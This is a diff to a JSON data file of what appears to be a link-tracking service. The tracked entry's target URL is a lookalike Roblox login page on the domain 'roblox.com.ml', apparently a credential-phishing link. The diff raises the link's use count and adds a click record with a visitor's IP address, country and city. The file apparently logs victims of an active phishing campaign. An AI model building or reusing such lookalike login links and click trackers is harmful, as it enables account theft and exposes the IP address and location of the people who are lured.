@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 804,
+    "useCount": 805,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6539,6 +6539,14 @@
       },
       {
         "timestamp": 1777167257246,
+        "ip": "190.67.206.200",
+        "country": "Colombia",
+        "city": "Ibagué",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
+      },
+      {
+        "timestamp": 1777167264766,
         "ip": "190.67.206.200",
         "country": "Colombia",
         "city": "Ibagué",
